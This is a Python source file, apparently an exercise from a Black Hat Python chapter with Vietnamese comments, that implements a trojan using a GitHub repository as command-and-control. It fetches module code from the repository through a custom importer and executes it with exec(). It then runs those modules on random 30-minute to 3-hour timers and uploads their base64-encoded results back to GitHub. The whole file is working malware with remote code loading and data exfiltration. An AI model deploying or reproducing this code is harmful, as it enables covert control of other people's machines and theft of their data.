import base64
import github3
import importlib.util
import json
import os
import random
import sys
import threading
import time
from datetime import datetime


def github_connect():
    """Kết nối đến GitHub repository."""
    with open('chapter_7/bhptrojan/my_token.txt') as f:
        token = f.read().strip()
    
    return github3.login(token=token).repository('ybvy', 'bhptrojan')


def get_file_content(path: str, repo) -> bytes:
    """Lấy nội dung file từ GitHub và giải mã base64."""
    file = repo.file_contents(path)
    return base64.b64decode(file.content)


class Trojan:
    def __init__(self, trojan_id: str):
        self.id = trojan_id
        self.config_file = f'config/{trojan_id}.json'
        self.data_path = f'data/{trojan_id}/'
        self.repo = github_connect()
        os.makedirs(self.data_path, exist_ok=True)

    def get_config(self):
        """Tải cấu hình từ GitHub và import module nếu cần."""
        config = json.loads(get_file_content(self.config_file, self.repo))
        for task in config:
            if task['module'] not in sys.modules:
                __import__(task['module'])
        return config

    def module_runner(self, module):
        """Chạy module và lưu kết quả."""
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        """Mã hóa và tải kết quả lên GitHub."""
        message = datetime.now().isoformat()
        path = f'data/{self.id}/{message}.data'
        encoded_data = base64.b64encode(bytes(repr(data), 'utf-8'))  # Giữ nguyên kiểu bytes

        try:
            # Kiểm tra xem file đã tồn tại chưa
            existing_file = self.repo.file_contents(path)
            self.repo.update_file(path, message, encoded_data, existing_file.sha)
        except github3.exceptions.NotFoundError:
            # Nếu file chưa tồn tại, tạo mới
            self.repo.create_file(path, message, encoded_data)


    def run(self):
        """Vòng lặp chính của Trojan."""
        while True:
            for task in self.get_config():
                threading.Thread(target=self.module_runner, args=(task['module'],)).start()
            time.sleep(random.randint(1800, 10800))  # 30 phút - 3 giờ


class GitImporter:
    def find_module(self, name, path=None):
        """Tìm module trên GitHub."""
        print(f"[*] Tải module: {name}")
        self.repo = github_connect()
        self.module_code = get_file_content(f'modules/{name}.py', self.repo)
        return self if self.module_code else None

    def load_module(self, name):
        """Tạo module từ mã tải về."""
        spec = importlib.util.spec_from_loader(name, loader=None)
        module = importlib.util.module_from_spec(spec)
        exec(self.module_code, module.__dict__)
        sys.modules[name] = module
        return module


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    Trojan('abc').run()
